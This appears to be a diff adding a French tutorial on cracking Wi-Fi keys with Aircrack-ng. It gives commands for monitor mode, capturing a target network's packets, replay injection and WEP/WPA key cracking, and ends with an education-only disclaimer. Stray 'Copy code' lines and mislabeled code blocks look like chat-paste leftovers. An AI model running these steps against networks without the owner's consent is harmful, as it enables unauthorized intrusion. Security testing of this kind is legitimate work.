@@ -1,0 +1,74 @@
+Étape 1 : Installation d'Aircrack-ng
+
+Si vous n'avez pas encore installé Aircrack-ng, vous pouvez le faire en utilisant la commande suivante :
+
+csharp
+Copy code
+sudo apt-get install aircrack-ng
+Étape 2 : Activer le mode moniteur
+
+La première étape pour utiliser Aircrack-ng est de passer votre carte réseau sans fil en mode moniteur. Pour ce faire, exécutez les commandes suivantes :
+
+Affichez la liste des interfaces réseau :
+Copy code
+sudo iwconfig
+Trouvez votre interface sans fil (généralement wlan0 ou similaire) et mettez-la en mode moniteur :
+Copy code
+sudo ifconfig wlan0 down
+sudo iwconfig wlan0 mode monitor
+sudo ifconfig wlan0 up
+Étape 3 : Recherche des réseaux Wi-Fi
+
+Utilisez "airodump-ng" pour rechercher les réseaux Wi-Fi à proximité :
+
+Copy code
+sudo airodump-ng wlan0
+Notez les informations sur le réseau que vous souhaitez tester, en particulier l'adresse MAC du point d'accès (BSSID) et le canal (CH).
+
+Étape 4 : Capturer les paquets de données
+
+Maintenant, nous allons capturer les paquets de données du réseau cible. Exécutez la commande suivante, en remplaçant <BSSID> et <CH> par les valeurs appropriées :
+
+php
+Copy code
+sudo airodump-ng -c <CH> --bssid <BSSID> -w capture wlan0
+Cela enregistrera les paquets capturés dans un fichier nommé "capture".
+
+Étape 5 : Injection de paquets (si nécessaire)
+
+Pour les réseaux WEP, il peut être nécessaire d'injecter des paquets pour accélérer le processus de capture des paquets de données. Utilisez "aireplay-ng" pour effectuer une attaque de réinjection de paquets :
+
+php
+Copy code
+sudo aireplay-ng -3 -b <BSSID> -h <YourMACAddress> wlan0
+Remplacez <YourMACAddress> par l'adresse MAC de votre interface sans fil.
+
+Étape 6 : Craquage de la clé de chiffrement
+
+Une fois que vous avez suffisamment de paquets de données capturés (au moins 10 000 pour WEP, beaucoup plus pour WPA), vous pouvez tenter de casser la clé de chiffrement avec "aircrack-ng" :
+
+Pour WEP :
+
+css
+Copy code
+sudo aircrack-ng -a 1 -b <BSSID> capture-01.cap
+Pour WPA :
+
+css
+Copy code
+sudo aircrack-ng -a 2 -w <WordlistPath> -b <BSSID> capture-01.cap
+Remplacez <WordlistPath> par le chemin d'accès à votre liste de mots de passe.
+
+Aircrack-ng tentera de casser la clé de chiffrement et, si réussi, affichera la clé trouvée.
+
+Étape 7 : Restaurer la configuration réseau
+
+Après avoir terminé vos tests, n'oubliez pas de remettre votre interface réseau sans fil en mode normal. Pour ce faire, exécutez les commandes suivantes :
+
+Copy code
+sudo ifconfig wlan0 down
+sudo iwconfig wlan0 mode managed
+sudo ifconfig wlan0 up
+Cela désactivera le mode moniteur et remettra votre carte réseau sans fil en mode normal.
+
+N'oubliez pas que ce tutoriel est destiné à des fins éducatives et doit être utilisé uniquement pour tester la sécurité de votre propre réseau ou avec le consentement explicite du propriétaire du réseau.
